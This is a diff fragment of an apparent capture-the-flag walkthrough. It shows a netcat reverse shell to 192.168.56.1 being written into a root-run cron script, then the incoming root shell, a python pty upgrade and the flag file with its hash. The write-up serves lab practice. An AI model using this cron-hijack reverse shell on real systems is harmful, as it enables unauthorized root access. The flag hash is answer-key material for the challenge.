@@ -569,4 +569,28 @@ drwxr-xr-x 10 root root 4096 Jun  3  2016 ..
 www-data@red:/etc/cron.d$ echo "nc.tranditional 192.168.56.1 2212 -e /bin/bash" > /usr/local/sbin/cron-logrotate.sh    
 <68.56.1 2212 -e /bin/bash" > /usr/local/sbin/cron-logrotate.sh  
 
+Connection received on 192.168.56.4 50398
+python -c "import pty;pty.spawn('/bin/bash')"
+root@red:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@red:~# ls
+ls
+fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
+root@red:~# cat flag.txt
+cat flag.txt
+~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)  
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+
 
